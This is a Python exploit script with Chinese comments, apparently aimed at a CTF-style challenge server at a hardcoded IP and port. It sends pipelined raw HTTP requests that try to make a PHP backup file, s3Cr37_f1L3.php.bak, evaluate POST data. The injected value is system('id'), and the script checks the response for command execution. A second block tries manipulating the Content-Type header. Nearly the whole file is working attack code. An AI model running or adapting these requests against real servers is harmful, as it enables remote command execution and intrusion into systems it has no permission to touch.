import socket
import urllib.parse

host = '61.147.171.105'
port = 58039

# 关键洞察：
# 如果 pipelining 请求能保留 path_translated，
# 也许也能保留 $_POST 数据！
# 
# 策略：
# 1. POST 到 .bak 文件，发送 admin 参数
# 2. 紧接着 GET 一个 .php 文件
# 3. 如果 $_POST 被保留，且 path_translated 指向 .bak
#    可能会执行 eval($_POST["admin"])

print("=== Test: POST data preservation ===")

cmd = 'system("id");'
post_data = 'admin=' + urllib.parse.quote(cmd)

# 尝试不同的组合
payloads = [
    # POST 到不存在的 .php 文件（会触发 index.php 路由）
    # 然后 GET .bak 触发 path_translated 替换
    (
        'POST /nonexistent.php HTTP/1.1\r\n'
        'Host: ' + host + '\r\n'
        'Content-Type: application/x-www-form-urlencoded\r\n'
        'Content-Length: ' + str(len(post_data)) + '\r\n'
        '\r\n' + post_data + '\r\n'
        'GET /s3Cr37_f1L3.php.bak HTTP/1.1\r\n'
        '\r\n'
    ),
    
    # POST 带 admin 参数到 .php，然后 GET .bak
    (
        'POST /index.php HTTP/1.1\r\n'
        'Host: ' + host + '\r\n'
        'Content-Type: application/x-www-form-urlencoded\r\n'
        'Content-Length: ' + str(len(post_data)) + '\r\n'
        '\r\n' + post_data + '\r\n'
        'GET /s3Cr37_f1L3.php.bak HTTP/1.1\r\n'
        '\r\n'
    ),
    
    # GET .bak，然后 POST 到任意 .php
    (
        'GET /s3Cr37_f1L3.php.bak HTTP/1.1\r\n'
        'Host: ' + host + '\r\n'
        '\r\n'
        'POST /index.php HTTP/1.1\r\n'
        'Host: ' + host + '\r\n'
        'Content-Type: application/x-www-form-urlencoded\r\n'
        'Content-Length: ' + str(len(post_data)) + '\r\n'
        '\r\n' + post_data
    ),
    
    # POST 到 .bak，然后 GET .php（检查是否执行了 .bak 的内容）
    (
        'POST /s3Cr37_f1L3.php.bak HTTP/1.1\r\n'
        'Host: ' + host + '\r\n'
        'Content-Type: application/x-www-form-urlencoded\r\n'
        'Content-Length: ' + str(len(post_data)) + '\r\n'
        '\r\n' + post_data + '\r\n'
        'GET /index.php HTTP/1.1\r\n'
        '\r\n'
    ),
]

for i, payload in enumerate(payloads):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect((host, port))
    sock.send(payload.encode())
    
    response = b''
    while True:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response += chunk
        except socket.timeout:
            break
    sock.close()
    
    resp_str = response.decode('utf-8', errors='replace')
    print(f"\n=== Payload {i+1} ===")
    print(resp_str[:2000])
    
    if 'uid=' in resp_str:
        print("\n\n!!! COMMAND EXECUTED !!!")

# 更深入的测试：尝试利用 CONTENT_TYPE 漏洞
print("\n\n=== Test: Content-Type manipulation ===")

# 有些 PHP 版本可能对 Content-Type 处理不当
payload_ct = (
    'POST /s3Cr37_f1L3.php.bak HTTP/1.1\r\n'
    'Host: ' + host + '\r\n'
    'Content-Type: application/x-httpd-php\r\n'  # 尝试指定 PHP 类型
    'Content-Length: ' + str(len(post_data)) + '\r\n'
    '\r\n' + post_data
)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(5)
sock.connect((host, port))
sock.send(payload_ct.encode())

response = b''
while True:
    try:
        chunk = sock.recv(4096)
        if not chunk:
            break
        response += chunk
    except socket.timeout:
        break
sock.close()
print(response.decode('utf-8', errors='replace')[:1000])
